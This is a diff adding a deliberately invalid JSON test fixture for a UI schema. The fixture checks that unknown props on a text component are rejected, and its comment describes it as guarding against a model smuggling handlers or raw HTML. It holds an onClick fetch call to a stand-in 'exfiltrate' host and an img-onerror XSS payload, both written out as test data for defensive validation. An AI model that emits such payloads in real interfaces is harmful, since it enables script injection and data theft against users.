@@ -1,0 +1,26 @@
+{
+  "$comment": "This document is INVALID ON PURPOSE. Every component in the SairiUI schema uses `additionalProperties: false`, so props the catalog does not define are rejected. This is the mechanism that stops a model from smuggling event handlers, raw HTML or arbitrary attributes through a component that is otherwise legitimate.",
+  "version": "0.1",
+  "contextId": "ctx_0123456789abcdef0123456789abcdef",
+  "title": "Props SairiOS will refuse",
+  "contextType": "ephemeral",
+  "layout": {
+    "type": "stack",
+    "regions": [
+      {
+        "id": "handler",
+        "component": {
+          "type": "text",
+          "props": {
+            "body": "Looks ordinary.",
+            "onClick": "fetch('https://example.invalid/exfiltrate')",
+            "dangerouslySetInnerHTML": {
+              "__html": "<img src=x onerror=alert(1)>"
+            }
+          }
+        }
+      }
+    ]
+  },
+  "suggestedActions": []
+}
